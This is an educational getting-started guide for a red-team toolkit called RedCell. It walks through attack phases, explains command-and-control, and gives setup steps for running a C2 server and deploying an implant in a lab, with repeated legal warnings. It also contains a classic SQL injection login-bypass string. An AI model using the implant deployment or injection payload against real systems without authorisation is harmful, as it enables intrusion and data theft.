# Getting Started with RedCell - A Beginner's Guide

**Welcome!** If you're new to cybersecurity or red teaming, this guide will help you understand what RedCell is and how to use it safely and legally.

## What is RedCell?

Think of RedCell as a **practice toolkit for ethical hackers**. Just like firefighters practice with controlled burns, cybersecurity professionals need to practice finding and exploiting vulnerabilities in a safe, controlled environment.

RedCell simulates what a real attacker might do when trying to break into a computer network, but it's designed for **educational and authorized testing only**.

## The Big Picture: How Hackers Actually Work

When you watch movies, hackers seem to break in instantly. In reality, professional attackers (and the security experts who defend against them) follow a step-by-step process:

### Phase 1: Reconnaissance (Looking Around)
**What it means:** Like a burglar casing a neighborhood, attackers first gather information about their target.

**What RedCell does:**
- Scans networks to find computers and what services they're running
- Checks websites for vulnerabilities
- Identifies potential entry points

**Real-world example:** Finding that a company's web server is running outdated software

### Phase 2: Initial Access (Getting In)
**What it means:** Finding and exploiting a weakness to get your first foothold inside the network.

**What RedCell does:**
- Tests for SQL injection (tricking databases into giving you access)
- Tries command injection (sneaking commands into web forms)
- Creates fake login pages (phishing) to capture credentials
- Tests file upload vulnerabilities

**Real-world example:** Using a SQL injection to bypass a login page without knowing the password

### Phase 3: Persistence & Privilege Escalation (Staying In & Getting More Power)
**What it means:** Once inside, attackers want to maintain access and get administrator privileges.

**What RedCell does:**
- Creates hidden ways to get back in later (persistence)
- Finds misconfigurations that allow normal users to become administrators
- Extracts passwords and credentials from memory

**Real-world example:** Creating a scheduled task that reconnects to your command server every hour

### Phase 4: Lateral Movement (Spreading Out)
**What it means:** Moving from one compromised computer to other computers on the network.

**What RedCell does:**
- Uses stolen credentials to access other systems
- Exploits network protocols like SMB and WMI
- Sprays credentials across multiple machines

**Real-world example:** Using an admin password from one computer to access 50 other computers

### Phase 5: Data Exfiltration (Stealing Information)
**What it means:** Identifying valuable data and secretly copying it out of the network.

**What RedCell does:**
- Searches for sensitive files (passwords, documents, databases)
- Encrypts and compresses data to hide it
- Sends data out through HTTP or DNS tunneling

**Real-world example:** Finding a database of customer information and uploading it to an external server

### Phase 6: Cleanup & Reporting (Covering Tracks & Documentation)
**What it means:** Removing evidence of the attack and documenting everything for the client.

**What RedCell does:**
- Generates professional penetration testing reports
- Extracts Indicators of Compromise (IOCs) for defenders
- Creates attack timelines
- Cleans up artifacts left during testing

**Real-world example:** Providing a detailed report showing exactly how you compromised the network so the company can fix it

## Core Technology: The Command & Control (C2) Framework

### What is C2?

Imagine you're playing a video game where you control multiple characters at once. A **Command & Control server** is like the controller - it lets you send instructions to programs running on compromised computers.

**How it works in RedCell:**

1. **The Server** - Runs on your computer, waiting for connections
2. **The Implant** - A small program you run on the target system (with permission!)
3. **The Operator** - An interactive command-line interface where you type commands
4. **Encryption** - All communications are encrypted with military-grade AES-256-GCM

**Simple example:**
```
You (Operator) → "run whoami" → C2 Server → Encrypts → Implant (on target)
→ Runs command → "DESKTOP\user" → Encrypts → C2 Server → Shows you result
```

### Why Encryption Matters

Every message between your C2 server and implants is encrypted. Without the encryption key, anyone monitoring the network just sees gibberish. This simulates how real attackers hide their communications.

## Safety & Legal Warnings

### YOU MUST READ THIS

**Only use RedCell:**
- On systems you own
- On systems you have **written permission** to test
- In isolated lab environments
- For educational purposes

**NEVER use RedCell:**
- On systems you don't own
- Without explicit authorization
- On production networks without proper approval
- To cause harm or steal data

**Legal consequences:**
Unauthorized access to computer systems is a **federal crime** in most countries. The Computer Fraud and Abuse Act (CFAA) in the US can result in prison time and massive fines.

**If you're hired to do penetration testing:**
- Always get a signed contract (Rules of Engagement)
- Define exactly what systems you can test
- Set clear boundaries (what's off-limits)
- Document everything you do
- Report findings responsibly

## Setting Up Your Lab (The Safe Way)

### Option 1: Local Virtual Machines (Recommended for Beginners)

**What you need:**
- VirtualBox or VMware (free virtualization software)
- At least 8GB of RAM
- 50GB of free disk space

**Setup:**
1. Create a "virtual network" that's isolated from the internet
2. Install one VM with RedCell (your attacker machine)
3. Install one or more VMs as targets (use the included vulnerable web app)
4. Make sure the VMs can't reach the real internet

**Why this is safe:** Everything happens inside your computer. Even if something goes wrong, it can't affect real systems.

### Option 2: Cloud Lab (For More Advanced Users)

**What you need:**
- AWS/Azure/GCP account
- Ability to set up isolated VPCs (Virtual Private Clouds)
- Budget for cloud resources

**Important:** Only create and attack your own cloud resources. Never touch infrastructure you don't own.

## Quick Start: Your First Test

### Step 1: Install RedCell

```bash
# Clone the repository
git clone https://github.com/PeteSumners/redcell.git
cd redcell

# Create virtual environment
python -m venv venv

# Activate it (Windows)
venv\Scripts\activate

# Activate it (Linux/Mac)
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### Step 2: Start the C2 Server

```bash
python c2/server/main.py
```

You should see:
```
[*] Starting C2 server on 0.0.0.0:8443
[+] Server running!
```

### Step 3: Deploy an Implant (On Your Own Test VM!)

On a separate test machine (that you own!):

```bash
# Copy basic_implant.py to the test system
python c2/implant/basic_implant.py --server http://YOUR_IP:8443
```

### Step 4: Interact with the Implant

```bash
# Start the operator CLI
python c2/operator/cli.py

# List implants
implants

# Select an implant
use <implant_id>

# Run a command
run whoami
```

**Congratulations!** You just set up your first C2 infrastructure.

## Understanding the Tests

RedCell includes 226 automated tests. Think of these like practice problems that verify everything works correctly.

**To run tests:**
```bash
pytest tests/ -v
```

**What tests do:**
- Verify encryption works correctly
- Check that implants can register with the server
- Test SQL injection detection
- Validate privilege escalation enumeration
- And much more...

Tests use "mocking" - fake versions of network connections and system calls - so they're safe to run on your own computer.

## Common Questions

### "I'm not a programmer. Can I still use this?"

Basic Python knowledge helps, but you can start learning by:
1. Reading the code with comments
2. Running the examples
3. Modifying simple parameters
4. Checking the test files to see how things work

### "Is this legal?"

Using RedCell on your own systems: **Legal**
Using it in an authorized penetration test with a signed contract: **Legal**
Using it on systems without permission: **Illegal and unethical**

### "What if I break something?"

In a properly isolated lab, the worst that happens is you need to rebuild a virtual machine. This is why we use VMs - they're disposable.

### "How is this different from real malware?"

RedCell is designed for **authorized testing** and **education**. Real malware is designed to cause harm and evade detection. The techniques are similar, but the intent is completely different - RedCell helps defenders understand threats.

### "Can I use this to get a job?"

Absolutely! This project demonstrates:
- Understanding of the full attack lifecycle
- Programming skills (Python)
- Knowledge of MITRE ATT&CK framework
- Ability to document and report findings
- Familiarity with modern offensive security tools

When interviewing, focus on what you **learned** and how you practiced **responsibly**.

## Learning Path

If you're new to this field, here's a suggested learning order:

**Level 1: Complete Beginner**
1. Read this entire guide
2. Set up a virtual lab
3. Run the C2 server and implant
4. Read the Phase 1 code to understand C2 basics

**Level 2: Learning the Basics**
1. Run the network scanner on your test VMs
2. Try the SQL injection examples on the vulnerable web app
3. Study the test files to understand how each module works
4. Modify simple parameters and see what changes

**Level 3: Hands-On Practice**
1. Follow the phase guides (PHASE1_GUIDE.md, etc.)
2. Try different exploitation techniques
3. Write your own simple implant modifications
4. Generate reports from your test activities

**Level 4: Advanced Projects**
1. Create custom payloads
2. Build new exploitation modules
3. Integrate with other security tools
4. Develop your own persistence mechanisms

## Key Technologies Explained Simply

### AES-256-GCM Encryption
**What it is:** A super strong way to scramble data
**Why it matters:** Even if someone intercepts your C2 traffic, they can't read it
**Real-world use:** Banks, militaries, and secure messaging apps use this

### MITRE ATT&CK Framework
**What it is:** A big list of techniques that attackers actually use
**Why it matters:** Security professionals use this to categorize and defend against attacks
**Example:** T1190 = "Exploit Public-Facing Application"

### SQL Injection
**What it is:** Tricking a database by putting code into form fields
**Example:** Instead of typing "admin" as username, you type `' OR '1'='1' --`
**Why it works:** Poorly written code treats your input as instructions instead of data

### Pass-the-Hash
**What it is:** Using a password's encrypted form to log in (without knowing the actual password)
**Why it works:** Some authentication systems accept the hash instead of requiring the plain password
**Defender's fix:** Use modern authentication that doesn't allow this

## Resources for Learning More

**Free Online Training:**
- TryHackMe (tryhackme.com) - Beginner-friendly labs
- HackTheBox (hackthebox.eu) - More advanced challenges
- OWASP WebGoat - Practice web vulnerabilities safely

**Books:**
- "The Web Application Hacker's Handbook" - Web security fundamentals
- "Penetration Testing" by Georgia Weidman - Great introduction
- "Red Team Field Manual" - Quick reference guide

**Certifications:**
- CompTIA Security+ - Entry-level security knowledge
- CEH (Certified Ethical Hacker) - Offensive security basics
- OSCP (Offensive Security Certified Professional) - Highly respected hands-on cert

**Communities:**
- Reddit: r/netsec, r/AskNetsec
- Discord: Many cybersecurity learning servers
- Local: DEF CON groups, OWASP chapters

## Troubleshooting

### "The C2 server won't start"
- Check if port 8443 is already in use
- Make sure you installed all requirements
- Try running on a different port: `python c2/server/main.py --port 9000`

### "The implant won't connect"
- Verify the C2 server is running
- Check your firewall isn't blocking the connection
- Make sure you're using the correct IP address
- If testing across VMs, verify they're on the same network

### "Tests are failing"
- Some tests require specific dependencies
- Check you're using Python 3.8+
- Try: `pip install -r requirements.txt --upgrade`
- Read the test output - it usually tells you what's wrong

### "I get permission errors"
- Many privilege escalation and persistence features require admin/root
- Run your test VM as administrator when testing those features
- On Linux: `sudo python ...`
- On Windows: Run terminal as Administrator

## Final Thoughts

RedCell is a powerful educational tool that simulates real-world attack techniques. Use it to:
- Learn how attackers think
- Understand defensive security better
- Practice in a safe environment
- Build skills for a cybersecurity career

**Remember:**
- Always get permission
- Stay within legal and ethical boundaries
- Practice responsibly
- Use your knowledge to help defend, not attack

**Welcome to the world of offensive security!** Used responsibly, these skills help make the internet safer for everyone.

---

**Questions or Issues?**
- Check the main README.md for technical details
- Review the phase-specific guides (PHASE1_GUIDE.md, etc.)
- Read the code comments - they explain a lot
- Create an issue on GitHub if you find bugs

**Stay curious, stay ethical, stay legal.**
